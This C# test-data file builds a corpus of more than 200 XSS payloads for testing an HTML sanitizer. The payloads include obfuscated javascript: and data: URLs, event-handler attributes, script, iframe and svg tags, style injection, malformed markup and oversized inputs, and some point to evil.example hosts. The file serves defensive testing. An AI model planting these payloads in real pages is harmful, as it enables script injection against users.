using System.Globalization;

namespace MyriagentHub.Tests.Rendering;

/// <summary>一筆 XSS 語料：名稱（測試顯示用、不重複）與要淨化的 HTML</summary>
internal sealed record XssCase(string Name, string Html);

/// <summary>
/// ItemSanitizer 的 XSS 語料（WP4.2 計畫步 6、SEC-12：至少 200 筆）。分七類：危險的網址放進 href 與 src、白名單標籤上的事件與危險屬性、
/// 白名單以外的標籤、style、不合語法的寫法、巢狀與混合、超長與太深。控制字元在執行時組（原始檔裡不放看不見的字元）。
/// 步 15 的 conv-probe.mjs 會把這份語料淨化後的輸出送進真的瀏覽器（hub-xss.json）
/// </summary>
internal static class ItemSanitizerXssCorpus
{
    // 靜態初始化依宣告順序：Build() 用到 DangerousUrls，它一定要宣告在 All 之前
    /// <summary>危險（或不是本站、不在白名單）的網址：放進 a 的 href 與 img 的 src 各一筆</summary>
    public static IReadOnlyList<string> DangerousUrls { get; } = BuildUrls();

    public static IReadOnlyList<XssCase> All { get; } = Build();

    public static XssCase Get(string name) => All.Single(c => c.Name == name);

    private static List<string> BuildUrls()
    {
        var nul = ((char)0).ToString();
        var soh = ((char)1).ToString();
        var backslash = ((char)92).ToString();
        return
        [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "JAVASCRIPT:alert(1)",
            " javascript:alert(1)",
            "\tjavascript:alert(1)",
            "java\tscript:alert(1)",
            "java\nscript:alert(1)",
            "java\rscript:alert(1)",
            "java" + nul + "script:alert(1)",
            soh + "javascript:alert(1)",
            "&#106;avascript:alert(1)",
            "&#x6A;avascript:alert(1)",
            "&#X6a;avascript:alert(1)",
            "&#0000106;avascript:alert(1)",
            "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
            "java&#x09;script:alert(1)",
            "java&#10;script:alert(1)",
            "java&#0;script:alert(1)",
            "&#14;javascript:alert(1)",
            "javascript&colon;alert(1)",
            "javascript:alert&lpar;1&rpar;",
            "javascript:alert(1)//https://example.com",
            "vbscript:msgbox(1)",
            "VBScript:msgbox(1)",
            "livescript:alert(1)",
            "data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
            "DATA:text/html,x",
            "//evil.example/x",
            backslash + backslash + "evil" + backslash + "share" + backslash + "a.png",
            backslash + "/evil.example",
            "/" + backslash + "evil.example",
            "///evil.example",
            "file:///C:/Windows/win.ini",
            "jar:https://evil.example!/",
            "feed:javascript:alert(1)",
            "x-javascript:alert(1)",
            "/api/v1/ops/status",
            "/m/../api/v1/ops/status",
            "/m/%2e%2e/api",
            "/t/x/../../api",
            "/f//evil.example",
            "/m/x" + backslash + ".." + backslash + "api",
            "/M/x",
            "ftp://evil.example/x",
            "tel:123",
            "about:blank",
            "chrome://settings",
        ];
    }

    private static List<XssCase> Build()
    {
        var list = new List<XssCase>();
        void Add(string name, string html) => list.Add(new XssCase(name, html));

        // ① 危險的網址：a 的 href、img 的 src
        for (var i = 0; i < DangerousUrls.Count; i++)
        {
            var n = (i + 1).ToString("00", CultureInfo.InvariantCulture);
            Add($"網址{n}-a", $"<p><a href=\"{DangerousUrls[i]}\">點我</a></p>");
            Add($"網址{n}-img", $"<p><img src=\"{DangerousUrls[i]}\" alt=\"圖{n}\" /></p>");
        }

        // ② 白名單標籤上的事件屬性與危險屬性（語法都合格：要靠白名單拿掉）
        var tags = new (string Name, string Template)[]
        {
            ("p", "<p {0}>文字</p>"),
            ("a", "<a href=\"https://example.com\" {0}>連結</a>"),
            ("img", "<img src=\"/m/ok\" alt=\"圖\" {0} />"),
            ("code", "<pre><code class=\"language-js\" {0}>x</code></pre>"),
            ("span", "<span {0}>x</span>"),
            ("td", "<table><tbody><tr><td {0}>x</td></tr></tbody></table>"),
            ("li", "<ul><li {0}>x</li></ul>"),
            ("input", "<input disabled=\"disabled\" type=\"checkbox\" {0} />"),
        };
        var attributes = new[]
        {
            "onerror=\"alert(1)\"",
            "onload=\"alert(1)\"",
            "onclick=\"alert(1)\"",
            "onmouseover=\"alert(1)\"",
            "onfocus=\"alert(1)\" autofocus=\"autofocus\"",
            "onanimationstart=\"alert(1)\"",
            "formaction=\"javascript:alert(1)\"",
            "style=\"background:url(javascript:alert(1))\"",
            "srcset=\"javascript:alert(1)\"",
            "data-x=\"javascript:alert(1)\"",
        };
        foreach (var (tag, template) in tags)
        {
            for (var i = 0; i < attributes.Length; i++)
                Add($"屬性-{tag}-{i + 1:00}", string.Format(CultureInfo.InvariantCulture, template, attributes[i]));
        }

        // ③ 白名單以外的標籤（語法合格：整個標籤當成文字）
        var outside = new[]
        {
            "<script>alert(1)</script>",
            "<script src=\"https://evil.example/x.js\"></script>",
            "<p>前<script>alert(1)</script>後</p>",
            "<style>body{background:url(javascript:alert(1))}</style>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>",
            "<svg onload=\"alert(1)\"></svg>",
            "<svg><use href=\"data:image/svg+xml;base64,PHN2Zz4=\" /></svg>",
            "<svg><a href=\"javascript:alert(1)\"><text>x</text></a></svg>",
            "<svg><animate attributename=\"href\" to=\"javascript:alert(1)\" /></svg>",
            "<svg><set attributename=\"onmouseover\" to=\"alert(1)\" /></svg>",
            "<math><mtext><table><mglyph><style><img src=\"/m/x\" alt=\"a\" /></style></mglyph></table></mtext></math>",
            "<math href=\"javascript:alert(1)\">x</math>",
            "<object data=\"javascript:alert(1)\"></object>",
            "<embed src=\"javascript:alert(1)\" />",
            "<base href=\"https://evil.example/\" />",
            "<form action=\"https://evil.example\"><button>送出</button></form>",
            "<button formaction=\"javascript:alert(1)\">x</button>",
            "<input type=\"image\" src=\"javascript:alert(1)\" />",
            "<input type=\"text\" value=\"x\" onfocus=\"alert(1)\" autofocus=\"autofocus\" />",
            "<textarea>x</textarea>",
            "<select><option>x</option></select>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\" />",
            "<link rel=\"stylesheet\" href=\"https://evil.example/x.css\" />",
            "<frameset><frame src=\"javascript:alert(1)\" /></frameset>",
            "<video src=\"/m/x\" onerror=\"alert(1)\"></video>",
            "<audio src=\"x\" onerror=\"alert(1)\"></audio>",
            "<video><source onerror=\"alert(1)\" /></video>",
            "<template><img src=\"/m/x\" alt=\"a\" /></template>",
            "<details open=\"open\" ontoggle=\"alert(1)\">x</details>",
            "<dialog open=\"open\">x</dialog>",
            "<marquee onstart=\"alert(1)\">x</marquee>",
            "<xmp><img src=\"x\" onerror=\"alert(1)\"></xmp>",
            "<plaintext><script>alert(1)</script>",
            "<noscript><p title=\"&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;\">x</p></noscript>",
            "<title><img src=\"/m/x\" alt=\"a\" /></title>",
            "<div onclick=\"alert(1)\">x</div>",
            "<isindex action=\"javascript:alert(1)\" />",
            "<image src=\"javascript:alert(1)\" />",
            "<keygen autofocus=\"autofocus\" onfocus=\"alert(1)\" />",
            "<portal src=\"https://evil.example\"></portal>",
            "<applet code=\"x\"></applet>",
            "<bgsound src=\"javascript:alert(1)\" />",
            "<frame src=\"javascript:alert(1)\" />",
            "<a2 href=\"javascript:alert(1)\">x</a2>",
            "<h7 onclick=\"alert(1)\">x</h7>",
        };
        for (var i = 0; i < outside.Length; i++)
            Add($"標籤{i + 1:00}", outside[i]);

        // ④ style 與表格屬性
        var cell = "<table><tbody><tr>{0}</tr></tbody></table>";
        var styles = new[]
        {
            string.Format(CultureInfo.InvariantCulture, cell, "<th style=\"background:url(javascript:alert(2))\">x</th>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td style=\"text-align: left; background:red;\">x</td>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<th style=\"width:expression(alert(1))\">x</th>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td style=\"text-align: left;\" style=\"x\">x</td>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td style=\"TEXT-ALIGN: LEFT;\">x</td>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td style=\"text-align:left;\">x</td>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td style=\"text-align: justify;\">x</td>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td style=\"text-align: left;&#10;behavior:url(x.htc)\">x</td>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td style=\"-moz-binding:url(https://evil.example/x.xml#x)\">x</td>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td style=\"text-align: left;\" colspan=\"1000\" rowspan=\"0\">x</td>"),
            string.Format(CultureInfo.InvariantCulture, cell, "<td colspan=\"2; onclick=alert(1)\">x</td>"),
            "<p style=\"color:red\">x</p>",
            "<span style=\"background-image:url(&quot;javascript:alert(1)&quot;)\">x</span>",
            "<ol start=\"1&quot; onclick=&quot;alert(1)\"><li>x</li></ol>",
        };
        for (var i = 0; i < styles.Length; i++)
            Add($"樣式{i + 1:00}", styles[i]);

        // ⑤ 不合語法：整段退回純文字
        var nul = ((char)0).ToString();
        var broken = new[]
        {
            "<a href=javascript:alert(1)>x</a>",
            "<a href='javascript:alert(1)'>x</a>",
            "<a href=\"javascript:alert(1)>x</a>",
            "<img src=x onerror=alert(1)>",
            "<a href=\"#\"onclick=\"alert(1)\">x</a>",
            "<!--<script>alert(1)</script>-->",
            "<!DOCTYPE html><p>x</p>",
            "<?xml version=\"1.0\"?><p>x</p>",
            "<![CDATA[<script>alert(1)</script>]]>",
            "<a\nhref=\"javascript:alert(1)\">x</a>",
            "<a  href=\"javascript:alert(1)\">x</a>",
            "<a href=\"#\" >x</a>",
            "< script>alert(1)</script>",
            "<script/src=\"https://evil.example/x.js\"></script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=\"javascript:alert(1)\">",
            "<a HREF=\"javascript:alert(1)\">x</a>",
            "<p>a > b</p>",
            "<p>a & b</p>",
            "<p>&unknown;</p>",
            "<p>&#106</p>",
            "<p>&#xZZ;</p>",
            "<p>&#99999999;</p>",
            "<p>&#x;</p>",
            "<p>&#;</p>",
            "<p>&amp</p>",
            "<a href=\"#\">x</a",
            "<p>x<",
            "<a href=\"#\" href=\"javascript:alert(1)\">x</a>",
            "<img src=\"/m/ok\" src=\"javascript:alert(1)\" alt=\"a\" />",
            "<p title=\"a\"b\">x</p>",
            "<br/>",
            "<p />",
            "<img src=\"/m/ok\" alt=\"<script>alert(1)</script>\" />",
            "<p title=\"x>y\">x</p>",
            "</p onclick=\"alert(1)\">",
            "</ p>",
            "<a href=\"x\"/>",
            "<xss:script>alert(1)</xss:script>",
            "<img src=\"/m/ok\" alt=\"a\"/onerror=alert(1)>",
            "<p\t>x</p>",
            "<p" + nul + ">x</p>",
            "<a href=\"#\" title=\"x\" title=\"y\">x</a>",
        };
        for (var i = 0; i < broken.Length; i++)
            Add($"語法{i + 1:00}", broken[i]);

        // ⑥ 巢狀與混合
        var mixed = new[]
        {
            "<a href=\"javascript:alert(1)\"><img src=\"javascript:alert(2)\" alt=\"巢狀\" /></a>",
            "<a href=\"#\"><a href=\"javascript:alert(1)\">y</a></a>",
            "<img alt=\"&quot; onerror=&quot;alert(1)\" src=\"/m/ok\" />",
            "<img src=\"https://evil.example/x.png\" alt=\"&lt;img src=x onerror=alert(1)&gt;\" />",
            "<p><strong><em>未閉合",
            "<ul><li>a<li>b</ul>",
            "</strong></p>前面沒有開頭",
            "<table><tr><td>x</td></tr></table><p>y",
            "<input type=\"checkbox\" />",
            "<input type=\"checkbox\" disabled=\"disabled\" onclick=\"alert(1)\" />",
            "<input type=\"checkbox\" disabled=\"disabled\" checked=\"javascript:alert(1)\" />",
            "<input disabled=\"disabled\" type=\"checkbox\" checked=\"checked\" form=\"x\" formaction=\"javascript:alert(2)\" />",
            "<a href=\"mailto:a@b.c?body=&lt;script&gt;alert(1)&lt;/script&gt;\">信</a>",
            "<span class=\"md-x language-y evil\" onclick=\"alert(1)\">x</span>",
            "<code class=\"language-&quot;&gt;&lt;script&gt;\">x</code>",
            "<a href=\"#\" target=\"_self\" rel=\"opener\">x</a>",
            "<a href=\"https://example.com\" title=\"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;\">x</a>",
            "<a href=\"/m/ok\" onmouseover=\"alert(1)\">媒體</a>",
            "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>",
            "<pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>",
            "<blockquote><p><a href=\"vbscript:msgbox(1)\">x</a></p></blockquote>",
            "<h1 onclick=\"alert(1)\">標題</h1>",
            "<del><img src=\"/m/ok\" alt=\"a\" onerror=\"alert(1)\" /></del>",
            "<li><input type=\"checkbox\" disabled=\"disabled\" /></li>",
            "<a href=\"https://evil.example\" rel=\"noopener noreferrer\" target=\"_blank\" rel2=\"x\">x</a>",
            "<img src=\"/t/ok?s=160\" alt=\"縮圖\" />",
            "<img src=\"/t/ok?s=160&amp;x=1\" alt=\"縮圖\" />",
            "<a href=\"/f/ok\">檔案</a>",
            "<a href=\"/f/ok/../../api\">檔案</a>",
            "<p>文字</p></p></p><p>",
            "<hr /><br><br /><hr>",
        };
        for (var i = 0; i < mixed.Length; i++)
            Add($"混合{i + 1:00}", mixed[i]);

        // ⑦ 超長與太深
        Add("超長01-href", "<a href=\"https://example.com/" + new string('a', 100_000) + "\">長</a>");
        Add("超長02-javascript", "<a href=\"javascript:alert(1)//" + new string('a', 100_000) + "\">長</a>");
        Add("超長03-img", "<img src=\"/m/" + new string('a', 50_000) + "\" alt=\"" + new string('b', 50_000) + "\" />");
        Add("超長04-title", "<p title=\"" + new string('x', 70_000) + "\">x</p>");
        Add("超長05-事件屬性", "<p " + string.Join(' ', Enumerable.Range(0, 2_000).Select(i => $"on{i}=\"alert(1)\"")) + ">x</p>");
        Add("超長06-實體", "<a href=\"" + string.Concat(Enumerable.Repeat("&#106;", 5_000)) + "avascript:alert(1)\">x</a>");
        Add("超長07-連結", "<p>" + string.Concat(Enumerable.Repeat("<a href=\"#\">x</a>", 2_000)) + "</p>");
        Add("超長08-沒閉合的引號", "<a href=\"" + new string('a', 10_000));
        Add("太深01-超過上限", string.Concat(Enumerable.Repeat("<blockquote>", 600)) + "<img src=\"x\" onerror=\"alert(1)\">");
        Add("太深02-上限內", string.Concat(Enumerable.Repeat("<blockquote>", 200)) + "<img src=\"javascript:alert(1)\" alt=\"深\" />");
        return list;
    }
}
